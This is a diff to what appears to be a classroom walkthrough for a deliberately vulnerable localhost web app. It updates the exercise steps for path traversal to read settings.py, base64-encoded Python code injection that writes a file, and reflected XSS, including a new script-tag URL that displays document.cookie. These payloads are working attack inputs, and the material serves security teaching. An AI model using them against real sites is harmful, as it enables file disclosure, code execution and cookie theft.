@@ -16,23 +16,30 @@ The solution is available live in the app after you've tried it.
 
 Start with
 
-    http://localhost:8000/user-profile?p=hacker.jpg
+    http://localhost:8000/user-pic?p=hacker.jpg
 
 Change the p= parameter to walk the file system:
 
-    http://localhost:8000/user-profile?p=../../settings.py
+    http://localhost:8000/user-pic?p=../../settings.py
 
 
 ## A1 Injection - Malicious Code Execution
 
-Open a interactive Python session, execute:
+Open a interactive Python session.
 
-    import base64;
-    base64.encodestring("file('p0wned.txt','w').write('boom!')")
+If you're using Python 3, execute:
+
+    import base64
+    base64.encodestring(b"open('p0wned.txt','w').write('boom!')")
+
+If you're using Python 2, execute:
+
+    import base64
+    base64.encodestring("open('p0wned.txt','w').write('boom!')")
 
 Copy and paste the value into the textbox:
 
-    ZmlsZSgncDB3bmVkLnR4dCcsJ3cnKS53cml0ZSgnYm9vbSEnKQ==
+    b3BlbigncDB3bmVkLnR4dCcsJ3cnKS53cml0ZSgnYm9vbSEnKQ==
 
 The solution is available live in the app after you've tried it.
 
@@ -58,6 +65,7 @@ Then change the URL:
     http://localhost:8000/cross-site-scripting/path-matching/";document.title="PLZ%20HACK%20MY%20USERS";"
 
 The solution is available live in the app after you've tried it.
+
 
 ## A3: Cross Site Scripting - Query Parameters
 
@@ -95,10 +103,15 @@ Or, to add attributes onto the input tag:
 
     " onclick="..." "
 
+You might try something like this:
+
+    http://localhost:8000/cross-site-scripting/form-field?qs=hello%22%3E%3Cscript%3Edocument.getElementById%28%27cookie%27%29.innerHTML%253Ddocument.cookie%253B%3C/script%3E%3Ca%20name%3D%22">/cross-site-scripting/form-field?qs=hello%22%3E%3Cscript%3Edocument.getElementById%28%27cookie%27%29.innerHTML%253Ddocument.cookie%253B%3C/script%3E%3Ca%20name%3D%22
+
 Your input will actually end up in the raw markup delivered to the client, but
 modern browsers are smart enough to block it and damage this content so that it
-doesn't act on it in a harmful way.  So we end up skipping this one in class,
-but it's a good idea to understand why.
+doesn't act on it in a harmful way.  So we usually end up skipping this one in
+class, but it's a good idea to understand why.
+
 
 ## A4: Insecure Direct Object References
 
